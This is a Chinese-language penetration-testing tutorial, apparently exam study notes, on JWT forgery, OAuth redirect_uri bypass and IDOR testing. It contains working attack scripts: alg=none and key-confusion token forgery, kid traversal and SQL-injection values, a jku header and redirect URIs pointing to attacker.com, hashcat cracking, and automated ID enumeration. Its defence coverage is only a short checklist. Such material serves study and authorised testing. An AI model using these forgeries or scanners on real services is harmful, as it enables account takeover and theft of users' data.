# 渗透测试：鉴权绕过与JWT/Token安全深度实战

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：渗透测试

## 📋 提纲

1. JWT 鉴权机制与常见漏洞
2. JWT 攻击六法
3. OAuth 2.0 常见漏洞
4. 越权漏洞 (IDOR/横向/纵向)
5. 鉴权绕过真实案例
6. 防御方案

---

## 1. JWT 鉴权机制

```
JWT = Header.Payload.Signature

Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"user": "admin", "role": "user", "exp": 1234567890}
Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)
```

### 1.1 JWT 攻击六法

**攻击1: alg:none（无签名）**
```python
import base64, json

# 修改Header: alg → none
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
# Payload改为admin权限
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=')
# 去掉签名部分（空）
token = (header + b"." + payload + b".").decode()
# 直接用这个token访问，如果服务端不验证alg=none → 绕过鉴权
```

**攻击2: 密钥爆破（弱密钥HS256）**
```bash
# 使用 hashcat 爆破JWT密钥
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# 或使用 jwt-cracker
python3 jwt-cracker.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U" /usr/share/wordlists/rockyou.txt abcdefghijklmnopqrstuvwxyz0123456789 6
```

**攻击3: 算法混淆（RS256 → HS256）**
```python
# 当服务端使用RS256（非对称）验证时：
# 1. 获取公钥（通常在 /.well-known/jwks.json）
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
-----END PUBLIC KEY-----"""

# 2. 用公钥作为HMAC密钥（HS256）
import jwt
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,  # 把公钥当HS256的secret
    algorithm="HS256",
    headers={"alg": "HS256"}  # 改alg
)
# 服务端用密钥+HS256验证，密钥=公钥 → 验证通过
```

**攻击4: kid参数注入**
```python
# 如果JWT的Header中有kid字段（Key ID）
# 可能被用于文件包含/SQL注入

# kid → 目录穿越读文件
header = {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../etc/passwd"}

# kid → SQL注入
header = {"alg": "HS256", "typ": "JWT", "kid": "xxx' UNION SELECT 'secret_key'--"}
```

**攻击5: JKU头注入（JWK Set URL）**
```python
# 如果支持jku/jwk参数，指向攻击者控制的JWK Set
header = {
    "alg": "RS256",
    "jku": "https://attacker.com/jwks.json",
    "kid": "attacker-key-1"
}
# 服务端会去attacker.com拉取公钥验证签名 → 用攻击者的密钥签名
```

**攻击6: 过期时间绕过**
```python
# 修改 exp 为未来时间
payload = {"user": "admin", "exp": 9999999999}
# 修改 nbf/iat 等时间字段
```

### 1.2 JWT 渗透工具脚本

```python
#!/usr/bin/env python3
"""JWT 攻击自动化"""

import jwt
import requests
import json
import base64

class JWTAttacker:
    def __init__(self, token, target_url):
        self.token = token
        self.url = target_url
        self.decoded = self.decode_jwt(token)

    def decode_jwt(self, token):
        """解码JWT（不验证签名）"""
        parts = token.split('.')
        if len(parts) != 3:
            return None

        header = json.loads(base64.urlsafe_b64decode(parts[0] + '==='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==='))

        return {
            "header": header,
            "payload": payload,
            "header_b64": parts[0],
            "payload_b64": parts[1],
            "signature": parts[2]
        }

    def test_none_algorithm(self):
        """测试 alg=none 漏洞"""
        header = {"alg": "none", "typ": "JWT"}
        payload = self.decoded['payload']
        payload['role'] = 'admin'  # 提权

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b'=').decode()

        fake_token = f"{header_b64}.{payload_b64}."
        return self.test_token(fake_token, "alg=none")

    def test_algorithm_confusion(self, public_key):
        """测试RS256→HS256算法混淆"""
        payload = self.decoded['payload'].copy()
        payload['role'] = 'admin'

        fake_token = jwt.encode(
            payload,
            public_key,
            algorithm='HS256',
            headers={'alg': 'HS256'}
        )
        return self.test_token(fake_token, "算法混淆")

    def test_kid_injection(self, kid_payload):
        """测试kid注入"""
        header = self.decoded['header'].copy()
        header['kid'] = kid_payload

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()

        fake_token = f"{header_b64}.{self.decoded['payload_b64']}.{self.decoded['signature']}"
        return self.test_token(fake_token, f"kid注入: {kid_payload}")

    def test_token(self, token, test_name):
        """测试伪造的token是否被接受"""
        resp = requests.get(
            self.url,
            headers={"Authorization": f"Bearer {token}"},
            verify=False
        )
        return {
            "test": test_name,
            "token": token[:80] + "...",
            "status": resp.status_code,
            "vulnerable": resp.status_code == 200
        }

    def run_all(self):
        results = []
        results.append(self.test_none_algorithm())
        # 如果有公钥，也测试算法混淆
        return results


# 使用
if __name__ == "__main__":
    attacker = JWTAttacker(
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature",
        "https://target.com/api/profile"
    )
    results = attacker.run_all()
    for r in results:
        print(f"[{'⚠️' if r['vulnerable'] else '✅'}] {r['test']}")
```

---

## 2. OAuth 2.0 常见漏洞

```
攻击向量：
1. redirect_uri 校验不严 → 授权码劫持
2. state参数缺失 → CSRF攻击
3. 隐式模式 → Access Token泄漏
4. scope权限提升
```

### 2.1 redirect_uri 绕过

```
# 正常：redirect_uri=https://app.com/callback
# 绕过方法：

https://app.com.attacker.com/callback    # 子域名劫持
https://app.com@attacker.com/callback    # @混淆
https://app.com%23@attacker.com/         # URL编码
https://app.com/callback/../../evil      # 路径穿越
https://app.com/callback?redirect=attacker.com  # 二次跳转
```

---

## 3. 越权漏洞 (IDOR)

```python
#!/usr/bin/env python3
"""IDOR (越权) 自动化检测"""

class IDORDetector:
    def __init__(self, base_url, session_a, session_b):
        self.url = base_url
        self.user_a = session_a  # 用户A的Cookie/Token
        self.user_b = session_b  # 用户B的Cookie/Token

    def test_horizontal_escalation(self, resource_pattern, id_range):
        """横向越权：用户A访问用户B的资源"""
        found = []
        for resource_id in id_range:
            url = resource_pattern.format(id=resource_id)

            # 用用户A的凭证访问
            resp_a = requests.get(url, headers=self.user_a, verify=False)

            if resp_a.status_code == 200:
                found.append({
                    "id": resource_id,
                    "type": "horizontal_escalation",
                    "data_preview": resp_a.text[:100]
                })
        return found

    def test_vertical_escalation(self, admin_endpoints):
        """纵向越权：普通用户访问管理员接口"""
        found = []
        for endpoint in admin_endpoints:
            resp = requests.get(
                f"{self.url}{endpoint}",
                headers=self.user_a,  # 普通用户凭证
                verify=False
            )
            if resp.status_code == 200:
                found.append({
                    "endpoint": endpoint,
                    "type": "vertical_escalation",
                })
        return found


# 使用
detector = IDORDetector(
    "https://target.com",
    {"Authorization": "Bearer user_a_token"},
    {"Authorization": "Bearer user_b_token"}
)

# 横向越权：遍历用户ID
horizontal = detector.test_horizontal_escalation(
    "/api/user/{id}/profile",
    range(1, 100)
)

# 纵向越权：测试管理员接口
vertical = detector.test_vertical_escalation([
    "/admin/users",
    "/api/admin/config",
    "/api/internal/stats"
])
```

---

## ✅ 鉴权安全 Checklist

- [ ] JWT: alg=none/密钥爆破/算法混淆/kid注入测试
- [ ] OAuth: redirect_uri/state参数/scope权限
- [ ] IDOR: 所有用户ID/订单ID/文件ID的越权测试
- [ ] 未授权访问: 直接访问管理接口绕过登录

> 📚 延伸阅读：Penetration/001-Web流程 | Penetration/003-SQL注入 | CodeAudit/010-Node.js审计

---

## 高分考点与知识巧记

### 高分考点速查表

| 考点 | 考察维度 | 记忆要点 |
|------|----------|----------|
| JWT鉴权机制 | 基础理论 | Header.Payload.Signature三部分；Base64Url编码；支持对称/非对称签名 |
| JWT六大攻击法 | 实战技巧 | alg=none、密钥爆破、算法混淆(RS256→HS256)、kid注入、jku注入、过期时间绕过 |
| OAuth 2.0漏洞 | 授权协议 | redirect_uri校验不严→授权码劫持；state缺失→CSRF；隐式模式→Token泄露 |
| 越权(IDOR)分类 | 权限模型 | 横向越权(同级别用户间)、纵向越权(低权限访问高权限)、IDOR(直接对象引用) |
| Token安全实践 | 防护机制 | 短有效期+Refresh Token、黑名单机制、绑定IP/UA、HTTPS传输 |

### 知识巧记口诀

> **JWT攻击口诀**：
> alg设none最经典，密钥爆破字典跑；
> RS256改HS256，公钥当密钥签名造；
> kid注入RCE风险高，jku指向恶意服务器。

> **越权检测口诀**：改ID、换Token、遍历资源看返回；水平垂直都要测，未授权访问别漏掉。

### 考试陷阱提醒

| 陷阱 | 正确认知 |
|------|----------|
| ❌ JWT是安全的，无法破解 | ✅ JWT本身不加密(仅Base64编码)，多种攻击方式可绕过，alg=none是最经典漏洞 |
| ❌ OAuth 2.0比OAuth 1.0更安全 | ✅ OAuth 2.0依赖HTTPS且实现复杂，redirect_uri不校验等问题反而引入新风险 |
| ❌ 做了鉴权就不会越权 | ✅ 鉴权(认证)≠授权，即使用户已登录也可能存在水平/垂直越权问题 |

> 💡 **一句话总结**：鉴权是安全的基石——JWT和OAuth是现代应用最主流的鉴权方案，理解其原理和攻击面是CISP考试的高频考点。
